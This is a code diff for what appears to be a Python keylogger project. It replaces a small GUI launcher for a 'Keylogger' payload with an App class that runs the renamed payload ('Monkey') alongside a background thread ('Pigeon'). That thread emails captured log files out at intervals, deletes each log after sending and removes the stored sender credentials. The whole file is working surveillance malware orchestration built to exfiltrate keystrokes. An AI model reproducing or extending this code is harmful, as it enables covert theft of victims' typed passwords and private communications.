@@ -1,43 +1,68 @@
-from tkinter import Tk, StringVar, Label, Entry, Button, DISABLED, W
-from tkinter import filedialog
-import subprocess
-from os import path, sep
+from os import path, remove
+from threading import Thread, Event
+from time import sleep
+from config import PigeonConfig, MonkeyConfig, AppConfig
+from paylaod import Monkey
+from sender import Pigeon
 
-from paylaod import Keylogger
 
-class Gui:
-    def __init__(self) -> None:
-        self.top = Tk()
-        self.home_dir = path.expanduser( '~' )
-        self.saving_dir = StringVar(self.top, self.home_dir + sep + "Documents")
-
-        self.create_widgets()
-        self.pack_widgets()
-
-        self.top.mainloop()
-
-    def _run_program(self):
-        self.top.destroy()
-        subprocess.Popen(Keylogger(self.saving_dir.get()).run())
-
-    def _browse_dir(self):
-        self.saving_dir.set(
-            filedialog.askdirectory(initialdir=self.saving_dir.get(),
-                                    title="Select Log Output Directory"))
-
-    def create_widgets(self):
-        self.label = Label(self.top, text="Select directory to save log outuput:")
-        self.saving_dir_input = Entry(self.top, 
-                                      textvariable=self.saving_dir, width=50, state=DISABLED, disabledbackground="white", disabledforeground="black")
-        self.browse = Button(self.top, text="Browse", command=self._browse_dir)
-        self.run = Button(self.top, text="Run", command=self._run_program)
-
-    def pack_widgets(self):
-        self.label.grid(row=0, column=0, columnspan=3, sticky=W)
-        self.saving_dir_input.grid(row=1, column=0)
-        self.browse.grid(row=1, column=1)
-        self.run.grid(row=1, column=2)
+class App:
+    def __init__(self, config: AppConfig,
+                 pigeon_config: PigeonConfig,
+                 monkey_config: MonkeyConfig) -> None:
+        
+        t1 = Thread(daemon=True, target=self.__start_sender, 
+                kwargs={"debug":config.debug,
+                        "email_frequency":config.email_frequency, 
+                        "pigeon_config":pigeon_config})
+        self.stop_event = Event()
+        try:
+            if config.sender_mode:
+                t1.start()  
+            Monkey(config=monkey_config).run()
+        finally:
+            if config.sender_mode:
+                if path.exists(pigeon_config.filepath):
+                    if Pigeon(pigeon_config).send():
+                        remove(pigeon_config.filepath)
+                self.stop_event.set()
+            exit(0)
+        
+    def __start_sender(self, debug: bool,
+                       email_frequency: int, 
+                       pigeon_config: PigeonConfig):
+        if debug:
+            sleep_time = 30
+        else:
+            sleep_time = max(10, email_frequency) * 60
+        counter=1
+        while not self.stop_event.is_set():
+            pigeon_config.filename = f'log_{counter}.txt'
+            sleep(sleep_time)
+            if not path.exists(pigeon_config.filepath):
+                continue
+            if Pigeon(pigeon_config).send():
+                remove(pigeon_config.filepath)
+                counter += 1
 
 
 if __name__ == '__main__':
-    Gui()
+    config = AppConfig()
+    pigeon_config = PigeonConfig()
+
+    secret_file = 'secret.txt'
+
+    if pigeon_config.sender_email=="":
+        if not path.exists(secret_file):
+            if config.debug:
+                with open(secret_file, 'w') as f:
+                    f.write("sender@gmail.com\ndemopass")
+            else:
+                exit()
+        pigeon_config.get_secret_from_file(secret_file)
+    if not config.debug:  
+        remove(secret_file)
+
+    App(config, pigeon_config, MonkeyConfig())
+
+    exit()
